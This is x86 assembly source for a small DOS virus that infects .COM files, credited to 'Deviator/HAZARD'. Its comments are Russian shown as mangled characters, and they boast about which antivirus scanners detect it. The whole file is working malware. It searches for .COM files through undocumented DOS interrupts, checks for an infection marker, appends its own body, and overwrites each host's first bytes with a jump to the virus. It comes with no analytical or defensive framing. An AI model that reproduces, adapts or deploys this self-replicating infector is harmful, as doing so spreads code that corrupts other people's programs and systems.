   ; Œˆª*®¡.200 by Deviator/HAZARD
   ; ‚®â ¢ ¬ ®ç¥à¥¤®¥ â¢€à¥¨¥. ’à¨¢¨ «ìë© search. *® ¯®çâ¨ ¥ ¨á¯®«ì§ã¥â
   ; 21 ¯à¥àë¢ ¨¥.

   ; ˜® £®ïâ  â¨¢¨àãáë:
   ; DrWeb 4.02 - Com.Crypt.Virus
   ; DrWeb 4.11 - Com.Virus
   ; AVP B128   - ®«ì   ¬ ááã

   ; € ¥é¥ ¢ £ §¥â å ¯¨èãâ è® AVP «ã¤è¥ ;)

   .model tiny
   .286
   .code
       org 100h
   main:   call entry          ;  *®«ãç¨¬  èã ¯®§¨æ¨î ¢ âãèª¥
   entry:  mov si,sp
       lodsw
       xchg ax,bp

       mov ds:[OurStack-Entry][Bp],ss  ; ‘®åà ¨¬ âãèª¨ áâ¥ª ¦)

       mov di,100h
       push di
       lea si,[_bytes-Entry][bp]   ; ‘®§¤ ¤¨¬ ¢¨¤¨¬®áâì ¯à¨£®¤®áâ¨ âãèª¨
       movsw
       movsw

       mov ah,1ah
       lea dx,[dta-Entry][bp]
       int 21h             ;; *¥à¢®¥ ¨á¯®«ì§®¢ ¨¥ i21h

       mov ax,1203h            ;; *®«ãç¨¬ á¥£¬¥â ¤ ëå „Ž‘ 
       int 2Fh

       push ds cs
       pop  ds ss

       lea dx,[msk-entry][bp]
       mov ah,4eh          ; ˆé¨¬ ä¨«¥ (âãèªã àë¡ª¨ ;)
   Fit:    int 21h             ; ‚â®à®¥ ¨á¯®«ì§®¢ ¨¥
       jnc Seek

       mov ss,cs:[OurStack-Entry][Bp]  ; ‚á¥ ! ’ãè¥ª ¡®«ìè¥ ¥â
       push cs cs          ;; ‚®ááâ ®¢¨¬ áâ¥ª ¨ á¥£¬¥â¨ª¨
       pop  es ds
       retn                ; * § ¤ !

   seek:   push ds bp
       mov ax,1226h            ; Žâªà®¥¬ ä¨«¥
       lea dx,[fname-Entry][bp]
       mov cl,2
       int 2Fh
       pop  bp ds

       xchg bx,ax

       lea dx,[_bytes-Entry][bp]
       push ds             ; *®ª®¢ëàï¥¬áï á ã¯ ª®¢ª®©
       pusha
       mov ax,1229h
       mov cl,4
       int 2Fh
       popa
       pop  ds

       mov si,dx
       lodsb
       cmp al,40h          ; “¦¥ ãá¯¥«¨ ¯®¬¥â¨âì ?
       jne Infect

   next:   push bp ds
       mov ax,1227h            ; „ , íâã ¡ ªã ¥ âà®£ ¥¬
       int 2Fh
       pop  ds bp

       mov ah,4fh          ; ‘«¥¤ãîé ï ¡ ª 
       jmp Fit

   _bytes  db  0cdh
       db  020h
       dw  0
   msk db  '*.com',0
       db  'Œˆª*®¡/Deviator'

   infect: push ds
       pusha
       mov ax,1228h            ; ‚ á ¬ãî £«ã¡¨ã ¡ ª¨
       mov bp,4202h
       xor cx,cx
       cwd
       int 2Fh
       popa
       pop ds

       mov ah,40h
       lea dx,[main-entry][bp]     ; * §¬®¦ ¥¬áï
       mov cx,vlen
       int 21h             ;; 3 ¨á¯®«ì§®¢ ¨¥

       mov ax,word ptr ds:[FSize-entry][Bp]

       sub ax,4            ;; “áâ ®¢¨¬ JMP
       mov word ptr ds:[temp+2-entry][bp],ax

       push ds
       pusha
       mov ax,1228h
       mov bp,4200h            ; *  á ¬ãî ¢¥àåãèªã ¡ ª¨
       xor cx,cx
       cwd
       nop
       int 2Fh
       popa
       pop ds

       mov ah,40h
       lea dx,[temp-entry][bp]     ; Ž¡á...¥¬ ¡ ªã (¯® á®¡ çì¨ - ¬¥â¨¬ ;)
       mov cl,4
       int 21h             ;; 4 ¨á¯®«ì§®¢ ¨¥ ¨ ¯®á«¥¤¥¥

       jmp next            ; ‘«¥¤ãîé ï âãèª 

   temp    db  40h
       db  0E9h            ; Œ¥âª 
       db  ?
       db  ?
   vlen    =   offset $ - 100h

   OurStack    dw  ?

   dta db  21  dup (?)
       db  ?
       dw  ?
       dw  ?
   FSize   dd  ?
   FName   db  13  dup (?)
   end main
